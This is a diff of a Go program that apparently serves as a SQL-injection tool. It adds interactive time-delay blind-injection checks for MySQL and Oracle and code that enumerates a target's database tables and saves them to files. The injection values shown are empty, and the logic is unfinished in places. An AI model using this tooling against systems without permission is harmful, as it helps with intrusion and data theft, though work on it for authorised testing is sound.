@@ -2,6 +2,7 @@ package main
 
 import (
 		"fmt"
+		"time"
 		"io/ioutil"
 		"os"
 		"log"
@@ -33,10 +34,49 @@ func get_response(data url.Values) (int, string) {
 }
 
 func blind_sqli_test() bool {
-	func oracle_time_delay() bool {
-
+	mysql_time_delay := func() bool {
+		data := url.Values {
+			"username":		{""},
+			"password":		{""},
+		};
+		start := time.Now();
+		code, body := get_response(data);
+		elapsed := time.Since(start)
+		fmt.Printf("(MySQL)Time between request and respone: %s\n", elapsed);
+		fmt.Println("Was the time delay successful?: ");
+		var response string;
+		fmt.Scanln(&response);
+		if (response == "Y") {
+			fmt.Println(body, code);
+			return true;
+		}
+		return false;
 	}
-	return true;
+
+	oracle_time_delay := func() bool {
+		data := url.Values {
+			"username":		{""},
+			"password":		{""},
+		};
+		start := time.Now();
+		code, body := get_response(data);
+		elapsed := time.Since(start)
+		fmt.Printf("(Oracle)Time between request and respone: %s\n", elapsed);
+		fmt.Println("Was the time delay successful?: ");
+		var response string;
+		fmt.Scanln(&response);
+		if (response == "Y") {
+			fmt.Println(body, code);
+			return true;
+		}
+		return false
+	}
+
+	result := mysql_time_delay();
+	if (!result) {
+		oracle_time_delay();
+	}
+	return false;
 }
 
 func check_sqli() bool {
@@ -68,12 +108,18 @@ func check_sqli() bool {
 	if (good && (body != "")) {
 		return true;
 	} else {
-		good = blind_sqli_test();
-		if (good) {
-			return true;
+		fmt.Println("Previous tests failed, move to blind testing?: ");
+		var response string;
+		fmt.Scanln(&response);
+		if (response == "Y") {
+			good = blind_sqli_test();
+			if (good) {
+				return true;
+			}
+			return false;
 		}
-		return false;
 	}
+	return false;
 }
 
 func get_version() string {
@@ -153,6 +199,7 @@ func mysql_database_data_enum() {
 		for _, val := range db_data {
 			fmt.Printf("\tTABLE NAME: %-50s\t|\tTABLE SCHEMA: %-25s\t|\tTABLE TYPE: %-10s\n", val.Id, val.Username, val.Password);
 		}
+		write_data("mysql.info", db_data);
 	}
 }
 
@@ -163,8 +210,14 @@ func oracle_database_data_enum() {
 	};
 	code, body := get_response(data);
 	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
-		fmt.Println(body);
-		write_data(body, "database_info.oracle");
+		var parsed_data string = parse_data(body);
+		var db_data []Userdata;
+		json.Unmarshal([]byte(string(parsed_data)), &db_data);
+		fmt.Println("DATABASE DATA DISCOVERED:\n");
+		for _, val := range db_data {
+			fmt.Printf("\tTABLE NAME: %-50s\t|\tTABLE SCHEMA: %-25s\t|\tTABLE TYPE: %-10s\n", val.Id, val.Username, val.Password);
+		}
+		write_data("oracledb.info", db_data);
 	}
 }
 
